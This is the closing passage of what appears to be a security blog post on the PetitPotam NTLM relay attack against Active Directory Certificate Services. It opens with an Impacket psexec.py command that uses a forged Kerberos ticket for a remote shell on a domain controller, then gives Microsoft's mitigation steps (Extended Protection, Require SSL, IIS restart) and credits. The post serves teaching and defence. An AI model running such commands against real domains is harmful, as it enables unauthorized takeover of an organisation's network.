<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
</code></pre></div></div>

<p><img src="/assets/petitpotam/golden-ticket-used.jpg" alt="golden-ticket-used" /></p>

<hr />

<h1 id="mitigation">Mitigation:</h1>
<h2 id="1-enable-epa-for-certificate-authority-web-enrollment">1. Enable EPA for Certificate Authority Web Enrollment</h2>
<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</p>

<p><img src="/assets/petitpotam/certsrv-epa-required.jpg" alt="certsrv-epa-required" /></p>

<h2 id="2-enable-epa-for-certificate-enrollment-web-service">2. Enable EPA for Certificate Enrollment Web Service</h2>
<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; <CA_NAME>\_CES\_Kerberos -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</CA_NAME></p>

<p><img src="/assets/petitpotam/certentrollwebsvc-epa-required.jpg" alt="certentrollwebsvc-epa-required" /></p>

<p>After enabling EPA in the UI, the <code class="language-plaintext highlighter-rouge">Web.config</code> file created by CES role at <code class="language-plaintext highlighter-rouge">&lt;%windir%&gt;\systemdata\CES\&lt;CA Name&gt;_CES_Kerberos\web.config</code> should also be updated by adding <code class="language-plaintext highlighter-rouge">&lt;extendedProtectionPolicy&gt;</code> set with a value of <code class="language-plaintext highlighter-rouge">Always</code></p>

<p><img src="/assets/petitpotam/web-config-editing.jpg" alt="web-config-editing" /></p>

<h2 id="3-enable-require-ssl-which-will-enable-only-https-connections">3. Enable Require SSL, which will enable only HTTPS connections.</h2>
<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; SSL Settings -&gt; Require SSL</p>

<p><img src="/assets/petitpotam/cert-srv-require-ssl.jpg" alt="cert-srv-require-ssl" /></p>

<h2 id="4-restart-iis">4. Restart IIS</h2>
<p><em>From an elevated command prompt,</em> type:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iisreset /restart
</code></pre></div></div>

<hr />

<h1 id="conclusion">Conclusion</h1>
<p>Having a non-secure AD CS Installation in a domain can present an attacker with an easy way to achieve Domain Admin privileges and gain Persistence.
Luckily enough, with some simple mitigation steps, this can be resolved.</p>

<hr />

<h1 id="credits">Credits</h1>
<ol>
  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote this excellent paper (https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)</li>
  <li><strong>Lionel Gilles</strong> for creating the <strong>PetitPotam</strong> Python Script</li>
  <li><strong>Yang Zhang</strong> of Back2Zero team &amp; <strong>Yongtao Wang</strong> (@Sanr) of BCM Social Corp, <strong>Eyal Karni, Marina Simakov and Yaron Zinar</strong> from Preempt &amp; <strong>n1nty</strong> from A-TEAM of Legendsec at Qi’anxin Group for the <strong>PrinterBug</strong> (CVE-2019-1040)</li>
  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts</li>
  <li><strong>Benjamin Delpy</strong> for the legendary <strong>mimikatz</strong></li>
  <li><strong>GhostPack</strong> for the <strong>Rubeus</strong> tool</li>
  <li><strong>Harshit Rajpal</strong> for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)</li>
  <li><strong>Microsoft Support</strong> for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)</li>
</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry></feed>